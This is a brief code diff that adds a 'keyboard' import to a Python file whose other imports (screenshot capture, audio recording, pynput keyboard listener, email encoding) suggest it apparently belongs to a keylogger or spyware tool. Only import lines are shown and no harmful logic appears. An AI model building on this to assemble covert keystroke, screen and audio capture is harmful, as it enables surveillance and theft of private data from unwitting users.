@@ -8,6 +8,7 @@ try:
     import wave
     import pyscreenshot
     import sounddevice as sd
+    import keyboard
     from pynput import keyboard
     from pynput.keyboard import Listener
     from email import encoders
